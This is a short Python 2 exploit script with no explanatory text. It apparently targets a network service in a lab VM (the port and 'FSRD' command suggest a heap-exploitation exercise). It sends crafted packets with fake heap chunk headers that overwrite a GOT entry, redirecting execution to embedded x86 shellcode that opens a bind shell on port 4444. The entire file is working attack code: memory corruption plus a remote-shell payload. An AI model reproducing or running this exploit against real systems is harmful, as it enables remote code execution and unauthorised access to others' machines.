import socket
import sys


def main():
	HOST = "192.168.56.101"
	PORT = 2993
	PACKET_SIZE = 128
	command = "FSRD"
	GOT_ADDR = "\x10\xd4\x04\x08"
	SHELLCODE_ADDR = "\x1c\xe0\x04\x08"
	shellcode = "\x90" * 24
	shellcode += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
	            "\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" \
	            "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" \
	            "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" \
	            "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" \
	            "\x0b\xcd\x80\x00"

	print "Shellcode len:", len(shellcode)

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	sock.connect((HOST, PORT))

	first_packet = command + "/" + "A" * 8 + shellcode + "A"*(PACKET_SIZE - len(command) - 1 - 8 - 4  - 1 - len(shellcode)) + "ROOT/"
	print "First packet length:", len(first_packet)

	payload = "\xf8\xff\xff\xff" + "\xfc\xff\xff\xff" + GOT_ADDR + SHELLCODE_ADDR
	second_packet = command + "ROOT" + "/" + payload + "C"*(PACKET_SIZE - len(command) - len(payload) - 4 - 1)
	print "Second packet length:", len(second_packet)

	dummy_packet = command + "/" + "ROOT" + "A" * (PACKET_SIZE - len(command) - 1 - 4)
	print "Dummy len:", len(dummy_packet)

	sock.send(first_packet + second_packet + dummy_packet + "\n")
	print(sock.recv(1024))

	sock.close()

if __name__ == "__main__":
	main()